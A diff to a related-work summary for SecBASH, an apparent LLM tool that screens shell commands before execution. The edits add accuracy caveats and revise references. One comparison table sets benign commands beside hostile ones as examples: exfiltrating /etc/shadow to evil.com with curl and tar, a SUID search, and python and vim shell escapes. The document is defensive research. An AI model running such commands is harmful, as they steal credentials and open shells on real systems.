@@ -11,7 +11,7 @@ This document summarizes the complete related work analysis for SecBASH, an LLM-
 | File | Topic | Tools/Projects Covered |
 |---|---|---|
 | [01-linux-security-mechanisms.md](./01-linux-security-mechanisms.md) | Standard Linux security tools | AppArmor, SELinux, seccomp, namespaces/cgroups, chroot, rbash, sudo, auditd, Firejail, Bubblewrap, grsecurity/PaX, iptables/nftables, Linux capabilities |
-| [02-ai-llm-security-tools.md](./02-ai-llm-security-tools.md) | AI/LLM-powered security tools | safe-shell, Claude Code, Copilot CLI, Amazon Q, Open Interpreter, ShellGPT, Warp, Nushell, E2B, NeMo Guardrails, Security Copilot, Charlotte AI, sudo_pair, ShellCheck |
+| [02-ai-llm-security-tools.md](./02-ai-llm-security-tools.md) | AI/LLM-powered security tools | Claude Code, Copilot CLI, Amazon Q, Open Interpreter, ShellGPT, Warp, Nushell, E2B, NeMo Guardrails, Security Copilot, Charlotte AI, sudo_pair, ShellCheck |
 | [03-threat-databases-and-detection.md](./03-threat-databases-and-detection.md) | Threat databases and detection frameworks | GTFOBins, LOLBAS, LOLDrivers, MITRE ATT&CK, Atomic Red Team, Sigma, YARA, Falco, osquery, Schonlau dataset, NL2Bash, OTRF/Mordor |
 | [04-shell-sandboxing-and-pam.md](./04-shell-sandboxing-and-pam.md) | Shell sandboxing and access management | lshell, GNU Rush, rssh, Teleport, Boundary, StrongDM, PAM, polkit, SSH forced commands, Docker, nsjail, Systrace, Janus, CyberArk, BeyondTrust, Delinea, Lynis, CIS Benchmarks, OpenSnitch |
 | [05-ids-anomaly-detection-academic.md](./05-ids-anomaly-detection-academic.md) | IDS, anomaly detection, academic ML security | OSSEC/Wazuh, Samhain/AIDE/Tripwire, ML-IDS, syscall analysis (Forrest et al.), UEBA, LLMs for cybersecurity, prompt injection, zero-shot classification, XAI for security, EDR (CrowdStrike, SentinelOne) |
@@ -25,7 +25,7 @@ This document summarizes the complete related work analysis for SecBASH, an LLM-
 ### By Relationship to SecBASH
 
 **Category 1: Directly Comparable** (LLM + command + security)
-- safe-shell (ryanshrott/safe-shell) -- closest known project
+- No known open-source project combining LLM analysis with pre-execution shell command blocking has been identified.
 
 **Category 2: Same Problem, Different Approach** (command safety without LLM)
 - Restricted shells (rbash, lshell, GNU Rush, rssh)
@@ -93,16 +93,16 @@ This document summarizes the complete related work analysis for SecBASH, an LLM-
 
 | Threat Type | SecBASH | Kernel MAC | seccomp | rbash | Sigma | Falco | EDR | HIDS |
 |---|---|---|---|---|---|---|---|---|
-| Reverse shells | **Block** | Partial | No | No | Detect | Detect | Detect+Block | Detect |
-| Shell escapes (GTFOBins) | **Block** | No | No | Partial | Detect | Detect | Detect+Block | No |
-| Privilege escalation | **Block** | Partial | Partial | No | Detect | Detect | Detect+Block | Detect |
-| Data exfiltration | **Block** | No | No | No | Detect | Partial | Detect+Block | No |
-| System file modification | **Block** | Partial | Partial | Partial | Detect | Detect | Detect+Block | Detect |
-| Fork bombs | **Block** | No | Partial | No | No | Detect | Partial | No |
-| Malware download+exec | **Block** | Partial | No | Partial | Detect | Detect | Detect+Block | Detect |
-| Container escapes | **Block** | Partial | Partial | No | Detect | Detect | Detect+Block | No |
+| Reverse shells | **Block\*** | Partial | No | No | Detect | Detect | Detect+Block | Detect |
+| Shell escapes (GTFOBins) | **Block\*** | No | No | Partial | Detect | Detect | Detect+Block | No |
+| Privilege escalation | **Block\*** | Partial | Partial | No | Detect | Detect | Detect+Block | Detect |
+| Data exfiltration | **Block\*** | No | No | No | Detect | Partial | Detect+Block | No |
+| System file modification | **Block\*** | Partial | Partial | Partial | Detect | Detect | Detect+Block | Detect |
+| Fork bombs | **Block\*** | No | Partial | No | No | Detect | Partial | No |
+| Malware download+exec | **Block\*** | Partial | No | Partial | Detect | Detect | Detect+Block | Detect |
+| Container escapes | **Block\*** | Partial | Partial | No | Detect | Detect | Detect+Block | No |
 
-**Key**: "Block" = prevents before execution; "Detect" = identifies after/during execution; "Partial" = works only under specific configurations; "No" = does not address.
+**Key**: "Block" = prevents before execution; "Detect" = identifies after/during execution; "Partial" = works only under specific configurations; "No" = does not address. \*SecBASH's blocking accuracy varies by model and category -- benchmark results show 60-100% detection rates depending on model and GTFOBins category. The "command" category is the hardest (~61% avg across models).
 
 ---
 
@@ -114,11 +114,13 @@ The fundamental insight motivating SecBASH: **every existing Linux security mech
 
 | Command Pair | Same Binary | Same Syscalls | Same SELinux Type | Same AppArmor Profile | SecBASH Distinguishes? |
 |---|---|---|---|---|---|
-| `curl https://api.github.com` vs. `curl -d @/etc/shadow http://evil.com` | Yes | Yes | Yes | Yes | **Yes** |
-| `find ~/docs -name '*.pdf'` vs. `find / -perm -4000 -type f` | Yes | Yes | Yes | Yes | **Yes** |
-| `tar czf backup.tar.gz ~/docs` vs. `tar czf - /etc/shadow \| base64 \| curl -d @- http://evil.com` | Yes (tar) | Yes | Yes | Yes | **Yes** |
-| `python3 script.py` vs. `python3 -c 'import pty; pty.spawn("/bin/sh")'` | Yes | Yes | Yes | Yes | **Yes** |
-| `vim document.txt` vs. `vim -c ':!/bin/bash'` | Yes | Yes | Yes | Yes | **Yes** |
+| `curl https://api.github.com` vs. `curl -d @/etc/shadow http://evil.com` | Yes | Yes | Yes | Yes | **Yes\*** |
+| `find ~/docs -name '*.pdf'` vs. `find / -perm -4000 -type f` | Yes | Yes | Yes | Yes | **Yes\*** |
+| `tar czf backup.tar.gz ~/docs` vs. `tar czf - /etc/shadow \| base64 \| curl -d @- http://evil.com` | Yes (tar) | Yes | Yes | Yes | **Yes\*** |
+| `python3 script.py` vs. `python3 -c 'import pty; pty.spawn("/bin/sh")'` | Yes | Yes | Yes | Yes | **Yes\*** |
+| `vim document.txt` vs. `vim -c ':!/bin/bash'` | Yes | Yes | Yes | Yes | **Yes\*** |
+
+\*SecBASH's ability to distinguish depends on the LLM model used; benchmark results show high but not perfect accuracy across models and categories.
 
 No kernel-level mechanism can make these distinctions because the system calls, binary names, file paths, and security labels are identical. The difference exists only at the semantic/intent level, which is where SecBASH operates.
 
@@ -182,7 +184,7 @@ No existing system -- academic, open-source, or commercial -- combines all five 
 1. **Adversarial robustness**: Command obfuscation (base64 encoding, variable substitution, backtick expansion) could bypass LLM analysis.
 2. **Prompt injection**: Crafted commands might manipulate the LLM's classification through embedded instructions.
 3. **Latency**: 100ms-2s per API call. Hybrid approaches (fast regex pre-filter + LLM for ambiguous cases) could mitigate.
-4. **Determinism**: LLMs may classify the same command differently across runs. Temperature=0 mitigates but doesn't eliminate.
+4. **Determinism**: LLMs may classify the same command differently across runs. Low temperature settings mitigate but don't eliminate this.
 5. **Context awareness**: Currently stateless (per-command). Session context could improve multi-step attack detection.
 6. **Local inference**: Small models (7B-13B) could enable on-device deployment, removing API dependency and reducing latency.
 
@@ -191,7 +193,6 @@ No existing system -- academic, open-source, or commercial -- combines all five 
 ## Key References
 
 ### Directly Related
-- safe-shell: https://github.com/ryanshrott/safe-shell
 - GTFOBins: https://gtfobins.github.io/
 - LOLBAS: https://lolbas-project.github.io/
 - MITRE ATT&CK T1059: https://attack.mitre.org/techniques/T1059/
@@ -208,18 +209,17 @@ No existing system -- academic, open-source, or commercial -- combines all five 
 - Schonlau et al. (2001), Masquerade Detection Dataset
 - Lin et al. (2018), "NL2Bash" (arXiv:1802.08979)
 - DeepLog (Du et al., CCS 2017)
-- "LLM-based IDS: A Survey" (2025, arXiv:2502.04572)
+- Kheddar (2024), "Transformers and Large Language Models for Efficient Intrusion Detection Systems: A Comprehensive Survey" (arXiv:2408.07583)
 - "When LLMs Meet Cybersecurity" (2024, arXiv:2405.03644)
 
 ### LLM Security
 - Greshake et al. (2023), "Indirect Prompt Injection" (arXiv:2302.12173)
-- OWASP Top 10 for LLM Applications: https://genai.owasp.org/llm-top-10/
+- OWASP Top 10 for LLM Applications (2025): https://genai.owasp.org/llm-top-10/
 - NeMo Guardrails: https://github.com/NVIDIA/NeMo-Guardrails
 
 ### Commercial PAM
 - CyberArk: https://www.cyberark.com/
 - BeyondTrust: https://www.beyondtrust.com/
-- PAM Market: $3.9B (2024) projected to $12.7B by 2032
 
 ### EDR
 - CrowdStrike Falcon: https://www.crowdstrike.com/platform/
